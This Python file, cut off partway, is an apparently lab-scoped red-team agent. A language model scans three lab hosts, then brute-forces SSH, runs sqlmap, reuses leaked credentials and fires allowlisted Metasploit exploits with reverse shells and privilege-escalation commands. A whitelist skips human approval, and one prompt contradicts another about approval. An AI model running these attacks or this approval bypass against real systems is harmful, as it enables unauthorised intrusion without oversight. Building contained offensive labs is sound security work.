#!/usr/bin/env python3
"""
Red-team agent -- the offense-side counterpart to pipeline/agent.py.

    python3 pipeline/redteam_agent.py                    # run a recon+assess campaign
    python3 pipeline/redteam_agent.py --provider gmi --model openai/gpt-4o   # via GMI Cloud
    python3 pipeline/redteam_agent.py --dry-run           # print the stage/tool plan only
    python3 pipeline/redteam_agent.py --list-pending      # show queued actions, full params
    python3 pipeline/redteam_agent.py --approve 7 --approved-by josh
    python3 pipeline/redteam_agent.py --execute-approved [--limit N] [--dry-run]
    python3 pipeline/redteam_agent.py --stats

THE GATE, read this before touching anything below: the model can identify
targets, assess vulnerabilities, and PROPOSE an exploitation/credential/
lateral-movement/exfil action via the propose_action tool -- but propose_action
only ever INSERTs a row into pending_actions. For a target OUTSIDE
redteam_exec.ALLOWED_NETWORKS that row lands as (approved=0, executed=0) and
sits there: the ONLY function that ever calls redteam_exec.run() for a gated
tool (hydra_bruteforce / sqlmap_scan / ssh_exec / msf_run_module) is
execute_pending_action(), and the ONLY way to reach it is `--execute-approved`,
which only touches rows a human already flipped approved=1 via a separate
`--approve <id>` invocation. Approving a row does not execute it. A plain
re-run of the campaign does not pick up approved rows either. --execute-approved
makes NO model call at all -- it replays the exact input_json a human already
reviewed, byte-for-byte, rather than re-asking the model to re-decide.

WHITELISTED-NETWORK EXCEPTION: cowrie, nginx, and metasploitable all resolve
inside redteam_exec.ALLOWED_NETWORKS (the soclab bridge, 10.211.0.0/24 as of
this writing) -- lab-internal, contained, and reversible by construction. For
a target in that range, tool_propose_action() calls
redteam_exec.in_whitelisted_network() and, if true, inserts the row already
approved (approved_by="auto-whitelist") and calls execute_pending_action()
immediately, in the same model turn that proposed it -- no `--approve`, no
`--execute-approved`, no human in the loop. The gated executors also drop
their intensity caps for a whitelisted target (see _exec_hydra_bruteforce /
_exec_sqlmap_scan's `unrestricted` branches): no thread/wordlist/level/risk
clamping, longer timeouts. Since ALLOWED_TARGETS is currently a strict subset
of ALLOWED_NETWORKS, every gated action this file can ever propose today
takes this path -- the pending/approve/execute-approved machinery above still
exists for any future target added to ALLOWED_TARGETS without also being
added to ALLOWED_NETWORKS.

Post-compromise chaining gets no separate exemption beyond the above: if an
executed ssh_exec or msf_run_module session succeeds and a later ASSESS pass
wants to run a further command using what it learned, that's a new
propose_action call, checked against the same whitelist as the first --
there's no additional "already inside, so now it's free" escape hatch beyond
network membership. This matters more for msf_run_module than it did for
ssh_exec: metasploitable is a real host, and a session opened by one
propose_action call does NOT persist to a later one (no msfrpcd running here,
each call is its own msfconsole process) -- privilege escalation on an
already-open session has to happen via session_commands within the SAME call
that opened it, not a follow-up proposal expecting to reconnect.

Scope fencing is a SEPARATE property from the approval gate: even the
autonomous RECON/ASSESS tools can only ever touch redteam_exec.ALLOWED_TARGETS
(cowrie, nginx, metasploitable) -- validate_target() is called in every
dispatch function before redteam_exec.run() is reached, regardless of gating
or whitelist status. msf_run_module additionally restricts `module` to
ALLOWED_MSF_MODULES -- an arbitrary module name from the model is rejected
before redteam_exec.run() is ever reached, same as an arbitrary target would be.
"""

import argparse
import hashlib
import hmac
import json
import os
import re
import sqlite3
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))       # pipeline/redteam
PIPELINE = os.path.dirname(HERE)                          # pipeline
ROOT = os.path.dirname(PIPELINE)                          # soc-lab root

sys.path.insert(0, HERE)
sys.path.insert(0, PIPELINE)
import executor as redteam_exec  # noqa: E402
from providers.claude import ClaudeProvider  # noqa: E402
from providers.fireworks import FireworksProvider  # noqa: E402
from providers.gmi import GMIProvider  # noqa: E402
from providers.local import LocalProvider  # noqa: E402

DB_PATH = os.path.join(ROOT, "soc.db")

# /loot inside soc-attacker IS ./attacker/loot on the host (compose.yaml) --
# writing wordlists/output here from Python on the host lands directly where
# the container-side tool invocations expect to read/write them, with no
# stdin-piping through docker exec required.
LOOT_HOST_DIR = os.path.join(ROOT, "attacker", "loot")
LOOT_CONTAINER_DIR = "/loot"

DEFAULT_PROVIDER = "local"
DEFAULT_MODEL = {
    "claude": "claude-sonnet-4-6",
    "local": "qwen3:8b",
    "gmi": "openai/gpt-4o-mini",
    "fireworks": "accounts/fireworks/models/glm-5p1",
}

RECON_MAX_ITERATIONS = 20
ASSESS_MAX_ITERATIONS = 15

GATED_TOOLS = ("hydra_bruteforce", "sqlmap_scan", "ssh_exec", "msf_run_module")

# Every entry here was verified end-to-end against the running metasploitable
# container (not just msf's own `check`, which several of these don't even
# implement) before being added -- `payload: None` means the module's own
# default payload was confirmed to actually open a session; a non-None value
# means the default was tried first and failed (usually because the target's
# minimal 2008-era userland is missing something the default payload needs,
# e.g. distcc_exec's default cmd/unix/reverse_bash relying on /dev/tcp, which
# this target's /bin/sh doesn't support) and this is the specific payload
# that was confirmed to work instead. Rank in Metasploit's own terms is not
# a factor here, only "does it open a session in this exact lab": usermap_script
# and java_rmi_server land root directly; distcc_exec lands as 'daemon', a
# real (not simulated) privilege-escalation target for session_commands to
# investigate.
ALLOWED_MSF_MODULES = {
    "exploit/multi/samba/usermap_script": {
        "payload": None,
        "description": (
            "Samba 3.0.20 'username map script' RCE (CVE-2007-2447), unauthenticated. "
            "Opens a root shell directly."
        ),
    },
    "exploit/multi/misc/java_rmi_server": {
        "payload": None,
        "description": (
            "Unauthenticated Java RMI registry RCE via class loader on port 1099. "
            "Opens a root meterpreter session directly."
        ),
    },
    "exploit/unix/misc/distcc_exec": {
        "payload": "cmd/unix/reverse_perl",
        "description": (
            "distccd allow_root misconfiguration RCE on port 3632, unauthenticated. "
            "Opens a shell as 'daemon', not root -- a real privilege-escalation target, "
            "not a simulated one. Follow up with session_commands (e.g. checking SUID "
            "binaries, sudo -l, writable config files) to look for a path to root."
        ),
    },
    "exploit/unix/irc/unreal_ircd_3281_backdoor": {
        "payload": "cmd/linux/http/x86/shell_reverse_tcp",
        "description": (
            "Trojaned UnrealIRCd 3.2.8.1 tarball backdoor on port 6667/6697, "
            "unauthenticated. Opens a root shell directly."
        ),
    },
}

# Juice Shop's own flag format (its data/static/challenges.yml examples all
# use this shape); Cowrie's honeyfs-planted flag matches it too, see
# cowrie/honeyfs/root/flag.txt.
FLAG_RE = re.compile(r"FLAG\{[^}]+\}")

# Juice Shop is only reachable from the host via nginx's published port --
# soc-attacker (inside the bridge) uses the bare hostname instead; see the
# tool_* functions below for that distinction.
JUICESHOP_HOST_URL = "http://localhost:8080"


# ---------------------------------------------------------------------------
# Tool schemas -- vendor-neutral {name, description, input_schema} shape,
# same convention as pipeline/agent.py's TOOLS.
# ---------------------------------------------------------------------------

RECON_TOOLS = [
    {
        "name": "nmap_scan",
        "description": "Port/service scan against one lab target. Read-only, autonomous.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "enum": ["cowrie", "nginx", "metasploitable"]},
                "ports": {"type": "string", "description": "e.g. '2222' or '1-1000'; omit for nmap's default"},
                "service_detection": {"type": "boolean", "default": True},
            },
            "required": ["target"],
        },
    },
    {
        "name": "http_probe",
        "description": "Fetch one or more paths from the web target through nginx and report status code plus a capped preview of the response body. Read-only content discovery.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "enum": ["nginx"]},
                "paths": {"type": "array", "items": {"type": "string"}, "maxItems": 25},
                "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            },
            "required": ["target", "paths"],
        },
    },
]

ASSESS_TOOLS = [
    {
        "name": "get_recon_findings",
        "description": (
            "Fetch this session's recon findings for review. Pass `target` to fetch just "
            "that target's findings; omit it to fetch all of them at once -- prefer one "
            "call with `target` omitted over one call per target, since each call returns "
            "the full findings payload for whatever it matches (all of them, if `target` "
            "is omitted) and repeating it per target only pays that cost multiple times "
            "for the same information."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "enum": ["cowrie", "nginx", "metasploitable"]},
            },
            "required": [],
        },
    },
    {
        "name": "get_loot",
        "description": "List loot artifacts recorded this session, with capped summaries.",
        "input_schema": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "get_pending_actions",
        "description": "This session's previously proposed actions, so you don't duplicate a proposal.",
        "input_schema": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "raise_vuln_finding",
        "description": "Record an identified vulnerability/weakness candidate. Safe, ungated -- does not attempt exploitation.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "enum": ["cowrie", "nginx", "metasploitable"]},
                "category": {"type": "string"},
                "severity": {"type": "string", "enum": ["info", "low", "medium", "high", "critical"]},
                "description": {"type": "string"},
                "evidence_ref": {"type": "array", "items": {"type": "integer"}},
            },
            "required": ["target", "category", "severity", "description"],
        },
    },
    {
        "name": "propose_action",
        "description": (
            "PROPOSE an exploitation, credential, lateral-movement, privilege-escalation, "
            "or exfiltration action. For a target inside the lab's whitelisted network "
            "(cowrie, nginx, metasploitable all qualify) this EXECUTES IMMEDIATELY, no "
            "human approval -- say what you did in the past tense once you see the "
            "result, not what you're proposing. For any other target it only queues a "
            "row for human approval and does not execute; don't claim to have exploited, "
            "breached, or accessed anything in that case, you did not and cannot. All "
            "four fields are required exactly as named -- tool, target, params, "
            "rationale. Example: to try a discovered credential against cowrie, call "
            "propose_action(tool=\"hydra_bruteforce\", target=\"cowrie\", "
            "params={\"username\": \"svc-deploy\", \"password\": \"the-actual-password\"}, "
            "rationale=\"credential found in exposed backup file\"). To exploit "
            "metasploitable, tool=\"msf_run_module\" with params={\"module\": one of "
            f"{sorted(ALLOWED_MSF_MODULES)}, \"session_commands\": optional list of "
            "shell commands to run on the session that opens (e.g. recon or privilege-"
            "escalation checks -- SUID binaries, sudo -l, writable configs). If the "
            "module lands a non-root shell, that's not a dead end: use session_commands "
            "in a follow-up proposal to look for a path to root."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string", "enum": list(GATED_TOOLS)},
                "target": {"type": "string", "enum": ["cowrie", "nginx", "metasploitable"]},
                "params": {"type": "object", "description": "tool-specific; validated at execution time, not here"},
                "rationale": {"type": "string"},
                "based_on": {"type": "array", "items": {"type": "integer"}, "description": "vuln_findings ids"},
            },
            "required": ["tool", "target", "params", "rationale"],
        },
    },
]

RECON_SYSTEM_PROMPT = """You are a penetration tester performing reconnaissance against a lab you
have explicit authorization to test. Exactly three targets are in scope -- do
not attempt to reach anything else, including the Docker host or any address
outside these three:
  cowrie          -- an SSH service (honeypot -- emulated shell, not a real OS)
  nginx           -- a web application, reverse-proxied
  metasploitable  -- a real, intentionally vulnerable Linux host with many
                      services exposed (FTP, SMB, RPC, mail, several
                      databases, a Java servlet container, IRC, and more).
                      Unlike cowrie this is a genuine OS -- findings here are
                      real, not emulated.

Use nmap_scan and http_probe to identify open ports, running services, and
web content. This is a READ-ONLY reconnaissance phase: you cannot exploit,
brute-force, or otherwise act on anything you find here -- that only happens
later, in a separate phase, and only after a human approves it. Your job
right now is purely to build an accurate picture of what's exposed.

Don't assume standard ports or a shallow set of paths are the whole story:
- Services in a lab like this are often reachable on non-standard ports --
  if a default scan comes back closed, it's worth trying a wider or
  different port range before concluding a service isn't there. metasploitable
  in particular runs several services well outside nmap's default top-1000
  (e.g. in the 1000-9000 range) -- a scan with `ports` unset or narrow will
  miss them; widen the range rather than concluding the host is quiet.
- For the web target, don't limit yourself to the site's own pages. Real
  engagements regularly turn up exposed backups, configs, or credential
  dumps left behind by mistake -- try paths like /backup, /.env, /.git,
  /config, /credentials and similar, not just what the app itself links to.
- This particular app is a single-page app with client-side routing, which
  means it can return HTTP 200 for almost ANY path, whether or not
  something real is actually there -- status code alone tells you very
  little here. Read the actual response body http_probe returns and
  compare it: a generic app shell looks the same every time, a real find
  looks different (plain text, a file listing, structured data, etc.).
- A directory-shaped guess returning something is a lead, not a dead end --
  if /backup looks interesting, also try specific filenames underneath it:
  /backup/credentials.txt, /backup/backup.zip, /backup/db.sql,
  /backup/.env, and similar. The filename is usually the part worth
  guessing, not just the directory.

When you've gathered enough evidence, stop calling tools and write a concise
summary: open ports, services and versions, web paths and their responses,
and anything that looks worth following up on."""

ASSESS_SYSTEM_PROMPT = """You are assessing the reconnaissance evidence already gathered against
cowrie, nginx, and metasploitable (a lab you're authorized to test) to
identify concrete vulnerabilities and propose next steps. All three targets
are inside the lab's whitelisted network, which means calling propose_action
against any of them runs immediately -- there is no human approval step for
this engagement, so treat propose_action as "do it", not "ask to do it".

For metasploitable specifically, use tool="msf_run_module" with a `module`
from this allowlist (any other module name will be rejected):
""" + "\n".join(f"  {m} -- {spec['description']}" for m, spec in ALLOWED_MSF_MODULES.items()) + """
Pass session_commands (a list of shell commands) to act on the session the
module opens -- recon, or privilege-escalation checks if the shell isn't
already root. This has to happen in the SAME propose_action call that opens
the session: sessions do not persist to a later call, so a follow-up
proposal cannot reconnect to one already open. If a module lands a non-root
shell, don't treat that as a dead end -- use session_commands right there to
look for a path to root (SUID binaries, sudo -l, writable configs, and
similar are worth checking).

Use get_recon_findings / get_loot / get_pending_actions to review what's
already known. Call raise_vuln_finding for anything you assess as a real
weakness (safe -- this only records your judgment, it doesn't act). If you
believe further action is warranted -- brute-forcing a credential, running
sqlmap, executing a command against a compromised host, anything beyond
looking -- call propose_action. Its result tells you what actually happened
(exit code, stdout/stderr) -- read that before deciding what to say. Only
describe an action as exploited/breached/accessed if the tool result you got
back actually shows that; don't claim a result you haven't seen.

If a recon finding contains what looks like actual credentials (a leaked
file, a config dump, anything with username/password pairs in it), that's
concrete grounds for a propose_action against cowrie using tool="ssh_exec" or
tool="hydra_bruteforce" with those exact values in params -- don't let found
credentials go unused just because they weren't the result you were
originally looking for.

When you're done, write a concise summary: what vulnerabilities you
identified, and what actions (if any) you proposed and why."""


def now_iso():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    with open(os.path.join(HERE, "schema.sql")) as f:
        conn.executescript(f.read())
    return conn


def _loot_paths(session_id, filename):
    """Returns (host_path, container_path) for a loot artifact -- write to
    host_path from Python, reference container_path in argv run inside
    soc-attacker. Same directory, two views of it."""
    rel = f"session-{session_id}/{filename}"
    host_path = os.path.join(LOOT_HOST_DIR, rel)
    os.makedirs(os.path.dirname(host_path), exist_ok=True)
    return host_path, f"{LOOT_CONTAINER_DIR}/{rel}"


def _record_recon_finding(conn, session_id, target, finding_type, detail, source_tool):
    conn.execute(
        "INSERT INTO recon_findings (session_id, target, finding_type, detail, source_tool, created) "
        "VALUES (?,?,?,?,?,?)",
        (session_id, target, finding_type, json.dumps(detail), source_tool, now_iso()),
    )
    conn.commit()


def _record_loot(conn, session_id, pending_action_id, tool, target, path, summary, exit_code):
    conn.execute(
        "INSERT INTO loot (session_id, pending_action_id, tool, target, path, summary, exit_code, created) "
        "VALUES (?,?,?,?,?,?,?,?)",
        (session_id, pending_action_id, tool, target, path, summary, exit_code, now_iso()),
    )
    conn.commit()


# ---------------------------------------------------------------------------
# RECON tool implementations -- autonomous, read-only. Every call persists
# to recon_findings as a side effect of dispatch, not dependent on the model
# remembering to "save" anything.
# ---------------------------------------------------------------------------

def tool_nmap_scan(conn, session_id, target, ports, service_detection):
    redteam_exec.validate_target(target)
    if target == "cowrie" and "2222" not in (ports or ""):
        # Cowrie in this lab only ever listens on 2222, never the standard
        # 22. Observed live: models both leaving `ports` unset (nmap's
        # top-1000 default doesn't include 2222) AND explicitly guessing
        # ranges like "1-1000" that still miss it, concluding "SSH closed"
        # and losing the credential angle entirely either way. Ground truth
        # we already know beats leaving this to the model's guess -- always
        # append 2222 rather than only filling in when omitted.
        ports = f"{ports},2222" if ports else "2222"
    out_host, out_ctr = _loot_paths(session_id, f"nmap-{target}-{int(time.time())}.txt")
    argv = ["nmap", "-Pn"]
    if ports:
        argv += ["-p", ports]
    if service_detection:
        argv.append("-sV")
    argv += [target, "-oN", out_ctr]
    result = redteam_exec.run(argv, timeout_s=120)
    _record_loot(conn, session_id, None, "nmap_scan", target, out_ctr, result.stdout[:2000], result.exit_code)
    _record_recon_finding(conn, session_id, target, "port_scan", {
        "argv": result.argv, "exit_code": result.exit_code,
        "timed_out": result.timed_out, "stdout": result.stdout,
    }, "nmap_scan")
    payload = {"exit_code": result.exit_code, "timed_out": result.timed_out, "stdout": result.stdout}
    return json.dumps(payload), bool(result.timed_out or (result.exit_code not in (0, None)))


_AUTOINDEX_LINK_RE = re.compile(r'<a href="([^"]+)">')


def _autofollow_listing(target, path, body, method):
    """If `body` looks like an nginx autoindex directory listing, fetch each
    linked file (not '../') and return their entries too. Closes a one-hop
    gap deterministically instead of counting on the model to notice a
    filename in a listing and issue a second http_probe call for it --
    observed live, a smaller local model does this inconsistently across
    otherwise-identical runs. One level deep only; this is a targeted fix
    for "found a directory, didn't open the file in it," not a crawler."""
    if "Index of " not in body:
        return []
    names = [m for m in _AUTOINDEX_LINK_RE.findall(body) if m != "../"]
    followed = []
    for name in names[:10]:
        sub_path = path.rstrip("/") + "/" + name
        r = redteam_exec.run(
            ["curl", "-s", "-L", "-X", method, f"http://{target}{sub_path}"],
            timeout_s=15, max_output_chars=1500,
        )
        followed.append({
            "path": sub_path, "status": None, "exit_code": r.exit_code,
            "body_preview": r.stdout.strip(),
            "note": f"auto-followed from directory listing at {path}",
        })
    return followed


def tool_http_probe(conn, session_id, target, paths, method):
    redteam_exec.validate_target(target)
    if target != "nginx":
        return json.dumps({"error": "http_probe only targets nginx"}), True
    results = []
    for p in (paths or [])[:25]:
        path = p if p.startswith("/") else "/" + p
        url = f"http://{target}{path}"
        # Two calls, not one write-out marker appended after the body: a
        # large response (e.g. Juice Shop's SPA falls back to index.html for
        # any unmatched path) gets truncated by redteam_exec's output cap,
        # which would silently eat a trailing status marker before it's ever
        # read. Separate calls means the body cap can't corrupt the status.
        status_r = redteam_exec.run(
            ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", method, url],
            timeout_s=15,
        )
        # Content discovery is useless if you only learn a path exists and
        # never see what's in it -- a leaked-credentials-shaped file has to
        # actually be read to be useful evidence in ASSESS. -L follows
        # redirects for the body fetch specifically (status_r above stays
        # unfollowed, so a 301 is still visible as its own signal) -- a
        # weaker model shouldn't have to reason "that was a redirect, I
        # should now separately request the Location" just to see a
        # directory listing that's one hop away.
        body_r = redteam_exec.run(
            ["curl", "-s", "-L", "-X", method, url], timeout_s=15, max_output_chars=1500,
        )
        entry = {
            "path": path, "status": status_r.stdout.strip() or None,
            "exit_code": body_r.exit_code, "body_preview": body_r.stdout.strip(),
        }
        results.append(entry)
        _record_recon_finding(conn, session_id, target, "http_path", entry, "http_probe")

        for sub_entry in _autofollow_listing(target, path, entry["body_preview"], method):
            results.append(sub_entry)
            _record_recon_finding(conn, session_id, target, "http_path", sub_entry, "http_probe")
    return json.dumps(results), False


def dispatch_recon_tool(conn, session_id, name, tool_input):
    """Never raises -- a bad/out-of-scope tool call is the model's problem to
    recover from, not a reason to fail the whole session. Same contract as
    agent.py's dispatch_tool()."""
    tool_input = tool_input or {}
    try:
        if name == "nmap_scan":
            return tool_nmap_scan(
                conn, session_id, tool_input.get("target"),
                tool_input.get("ports"), tool_input.get("service_detection", True),
            )
        if name == "http_probe":
            return tool_http_probe(
                conn, session_id, tool_input.get("target"),
                tool_input.get("paths") or [], tool_input.get("method", "GET"),
            )
        return json.dumps({"error": f"unknown tool: {name}"}), True
    except redteam_exec.ScopeError as e:
        return json.dumps({"error": str(e)}), True
    except Exception as e:  # noqa: BLE001 - goes back to the model, not up
        return json.dumps({"error": f"tool failed: {e}"}), True


# ---------------------------------------------------------------------------
# ASSESS tool implementations -- read-only reviews, a safe write
# (raise_vuln_finding), and THE GATE (propose_action). None of these ever
# call redteam_exec.run() for a gated tool.
# ---------------------------------------------------------------------------

def tool_get_recon_findings(conn, session_id, target=None):
    # Observed live against qwen3:8b: with no target filter available, it
    # called this 3x in a row (once per target, each with a different target
    # arg the old no-params schema silently ignored) and got the same ~4K-token
    # payload back all three times -- wasted tool-call budget and, stacked on
    # top of the also-grown ASSESS_SYSTEM_PROMPT, real context pressure against
    # providers/local.py's 8192-token num_ctx floor. Honoring the filter it was
    # already trying to use fixes both: a real target actually shrinks the
    # payload, and the tool description now says to omit it for "everything"
    # rather than needing 3 calls to reconstruct that.
    if target:
        rows = conn.execute(
            "SELECT id, target, finding_type, detail, source_tool, created "
            "FROM recon_findings WHERE session_id=? AND target=? ORDER BY id",
            (session_id, target),
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT id, target, finding_type, detail, source_tool, created "
            "FROM recon_findings WHERE session_id=? ORDER BY id", (session_id,),
        ).fetchall()
    return json.dumps([dict(r) for r in rows]), False


def tool_get_loot(conn, session_id):
    rows = conn.execute(
        "SELECT id, tool, target, path, summary, exit_code, created "
        "FROM loot WHERE session_id=? ORDER BY id", (session_id,),
    ).fetchall()
    return json.dumps([dict(r) for r in rows]), False


def tool_get_pending_actions(conn, session_id):
    # result_json included deliberately -- without it, an executed action
    # only shows executed=true with no way to tell success from failure, or
    # learn why. Observed live: the model needs this to notice "command is
    # required" and self-correct on a later proposal, not just see a dead
    # end and move on.
    rows = conn.execute(
        "SELECT id, tool, target, input_json, rationale, approved, executed, "
        "result_json, created FROM pending_actions WHERE session_id=? ORDER BY id",
        (session_id,),
    ).fetchall()
    return json.dumps([dict(r) for r in rows]), False


def tool_raise_vuln_finding(conn, session_id, target, category, severity, description, evidence_ref):
    # vuln_findings.category/severity/description are all NOT NULL -- without
    # this check a missing field surfaces as a raw sqlite3.IntegrityError
    # ("NOT NULL constraint failed: vuln_findings.category") which doesn't
    # tell the model what it actually needs to send. Observed live against
    # llama3.3:70b: it called this with a single ad-hoc {"vulnerability": ...}
    # field instead of the named category/severity/description, got the
    # cryptic DB error back, and just moved on without retrying -- the
    # finding was silently lost. A message naming exactly what's missing and
    # what's required gives any model a real chance to self-correct instead.
    missing = [name for name, val in
               (("category", category), ("severity", severity), ("description", description))
               if not val]
    if missing:
        raise ValueError(
            f"missing required field(s) {missing} -- raise_vuln_finding requires target, "
            "category, severity, and description, each sent as its own named argument "
            "(not e.g. a single free-text 'vulnerability' field)"
        )
    conn.execute(
        "INSERT INTO vuln_findings (session_id, target, category, severity, description, evidence_ref, created) "
        "VALUES (?,?,?,?,?,?,?)",
        (session_id, target, category, severity, description,
         json.dumps(evidence_ref) if evidence_ref else None, now_iso()),
    )
    conn.commit()
    return json.dumps({"ok": True}), False


def tool_propose_action(conn, session_id, tool, target, params, rationale, based_on):
    if tool not in GATED_TOOLS:
        return json.dumps({"error": f"unknown gated tool: {tool!r}, must be one of {GATED_TOOLS}"}), True
    redteam_exec.validate_target(target)  # fence even at proposal time -- fail loud, don't queue garbage
    if isinstance(params, str):
        # Observed live against llama3.3:70b: it sent `params` as a
        # JSON-encoded string instead of a nested object, even though the
        # schema declares it as type "object". json.dumps() below would then
        # double-encode that string -- execute_pending_action's single
        # json.loads() only undoes one layer, leaving a str where a dict is
        # expected and crashing the executor on params.get(...). Unwrap here
        # so both the stored row (for a human reviewing --list-pending) and
        # execution stay a clean single-encoded object.
        try:
            params = json.loads(params)
        except json.JSONDecodeError:
            pass  # not JSON after all -- store as given, execution will surface the real error

    # Whitelisted-network exception (see module docstring): a target fully
    # inside redteam_exec.ALLOWED_NETWORKS is lab-internal by construction,
    # so a gated action against it skips the approve/execute-approved round
    # trip and runs in this same call.
    auto = redteam_exec.in_whitelisted_network(target)
    ts = now_iso()
    cur = conn.execute(
        "INSERT INTO pending_actions (session_id, tool, target, input_json, rationale, based_on, "
        "approved, approved_by, approved_at, created) VALUES (?,?,?,?,?,?,?,?,?,?)",
        (session_id, tool, target, json.dumps(params or {}), rationale,
         json.dumps(based_on) if based_on else None,
         1 if auto else 0, "auto-whitelist" if auto else None, ts if auto else None, ts),
    )
    conn.commit()
    action_id = cur.lastrowid

    if not auto:
        return json.dumps({
            "ok": True, "queued": True, "executed": False,
            "note": "recorded for human approval; nothing was run",
        }), False

    row = conn.execute("SELECT * FROM pending_actions WHERE id=?", (action_id,)).fetchone()
    execute_pending_action(conn, row)
    row = conn.execute("SELECT result_json FROM pending_actions WHERE id=?", (action_id,)).fetchone()
    result = json.loads(row["result_json"]) if row["result_json"] else {}
    return json.dumps({
        "ok": True, "queued": False, "executed": True,
        "note": f"{target!r} is inside the whitelisted lab network -- executed "
                "immediately, no approval required",
        "result": result,
    }), bool(result.get("error"))


def dispatch_assess_tool(conn, session_id, name, tool_input):
    tool_input = tool_input or {}
    try:
        if name == "get_recon_findings":
            return tool_get_recon_findings(conn, session_id, tool_input.get("target"))
        if name == "get_loot":
            return tool_get_loot(conn, session_id)
        if name == "get_pending_actions":
            return tool_get_pending_actions(conn, session_id)
        if name == "raise_vuln_finding":
            return tool_raise_vuln_finding(
                conn, session_id, tool_input.get("target"), tool_input.get("category"),
                tool_input.get("severity"), tool_input.get("description"),
                tool_input.get("evidence_ref"),
            )
        if name == "propose_action":
            return tool_propose_action(
                conn, session_id, tool_input.get("tool"), tool_input.get("target"),
                tool_input.get("params") or {}, tool_input.get("rationale"),
                tool_input.get("based_on"),
            )
        return json.dumps({"error": f"unknown tool: {name}"}), True
    except redteam_exec.ScopeError as e:
        return json.dumps({"error": str(e)}), True
    except Exception as e:  # noqa: BLE001
        return json.dumps({"error": f"tool failed: {e}"}), True


# ---------------------------------------------------------------------------
# Gated execution -- reachable ONLY from execute_pending_action(). None of
# these three functions are in any TOOLS list a model ever sees.
# ---------------------------------------------------------------------------

def _exec_hydra_bruteforce(session_id, target, params, unrestricted=False):
    redteam_exec.validate_target(target)
    if target != "cowrie":
        raise ValueError("hydra_bruteforce only targets cowrie")
    # Accept both the documented plural (usernames/passwords, for an actual
    # brute-force list) and singular (username/password, for the common
    # case of "I found one real credential, try it") shapes. Observed live:
    # a model proposing hydra_bruteforce with a single discovered credential
    # naturally writes username/password, not a one-element list -- failing
    # that proposal on a param-naming technicality after it did the hard
    # part (finding a real leaked credential) would be a worse outcome than
    # just accepting the shape it actually sent.
    usernames = params.get("usernames")
    if not usernames and params.get("username"):
        usernames = [params["username"]]
    usernames = usernames or ["root"]

    passwords = params.get("passwords")
    if not passwords and params.get("password"):
        passwords = [params["password"]]
    passwords = passwords or []
    if not passwords:
        raise ValueError("passwords (or password) is required")

    # Outside the whitelisted network these lists and the thread count stay
    # capped/gentle even after human approval -- a whitelisted target is
    # lab-internal and disposable, so there's no reason to hold back: full
    # lists, more threads, more time.
    if not unrestricted:
        usernames = usernames[:20]
        passwords = passwords[:20]
    threads = "16" if unrestricted else "4"
    timeout_s = 600 if unrestricted else 180
    port = int(params.get("port", 2222))

    userlist_host, userlist_ctr = _loot_paths(session_id, "hydra-users.txt")
    passlist_host, passlist_ctr = _loot_paths(session_id, "hydra-pass.txt")
    with open(userlist_host, "w") as f:
        f.write("\n".join(usernames) + "\n")
    with open(passlist_host, "w") as f:
        f.write("\n".join(passwords) + "\n")

    out_host, out_ctr = _loot_paths(session_id, f"hydra-{target}-{int(time.time())}.txt")
    argv = ["hydra", "-L", userlist_ctr, "-P", passlist_ctr, "-t", threads, "-f",
            "-o", out_ctr, f"ssh://{target}:{port}"]
    result = redteam_exec.run(argv, timeout_s=timeout_s)
    return result, out_ctr


def _exec_sqlmap_scan(session_id, target, params, unrestricted=False):
    redteam_exec.validate_target(target)
    if target != "nginx":
        raise ValueError("sqlmap_scan only targets nginx")
    path = params.get("path") or "/rest/products/search"
    param = params.get("param") or "q"
    # sqlmap's own ceilings are level<=5, risk<=3. Outside the whitelisted
    # network this stays clamped to a gentler 1-3/1-2 band; a whitelisted
    # target gets sqlmap's actual max plus multiple threads, since it's
    # lab-internal and disposable.
    if unrestricted:
        level = min(max(int(params.get("level", 5)), 1), 5)
        risk = min(max(int(params.get("risk", 3)), 1), 3)
    else:
        level = min(max(int(params.get("level", 1)), 1), 3)
        risk = min(max(int(params.get("risk", 1)), 1), 2)
    timeout_s = 600 if unrestricted else 240

    out_dir_host, out_dir_ctr = _loot_paths(session_id, f"sqlmap-{int(time.time())}")
    os.makedirs(out_dir_host, exist_ok=True)
    url = f"http://{target}{path}?{param}=1"
    argv = ["sqlmap", "-u", url, "--batch", f"--level={level}", f"--risk={risk}",
            "--output-dir", out_dir_ctr]
    if unrestricted:
        argv.append("--threads=10")
    result = redteam_exec.run(argv, timeout_s=timeout_s)
    return result, out_dir_ctr


def _exec_ssh_exec(session_id, target, params, unrestricted=False):
    redteam_exec.validate_target(target)
    if target != "cowrie":
        raise ValueError("ssh_exec only targets cowrie")
    username = params.get("username") or "root"
    password = params.get("password") or ""
    command = params.get("command") or ""
    port = int(params.get("port", 2222))
    if not command:
        raise ValueError("command is required")
    timeout_s = 300 if unrestricted else 60

    argv = ["sshpass", "-p", password, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
            "-o", "NumberOfPasswordPrompts=10",
            f"{username}@{target}", "-p", str(port), command]
    result = redteam_exec.run(argv, timeout_s=timeout_s)
    return result, None


def _exec_msf_run_module(session_id, target, params, unrestricted=False):
    """Runs one allowlisted msf module against metasploitable via a resource
    script (-r, not -x): a file sidesteps the quoting/newline issues a
    semicolon-joined -x string hits, and doubles as a loot artifact like
    hydra's wordlists or sqlmap's --output-dir.

    `exploit -z` backgrounds the opened session instead of letting msfconsole
    auto-interact with it -- verified live that without -z a shell-type
    payload attaches the foreground console to the session, which then hangs
    reading a closed stdin until redteam_exec's own outer timeout kills it,
    never reaching the sessions -c/-K/exit -y cleanup lines below it in the
    script. The `sleep 3` gives the handler a moment to settle before
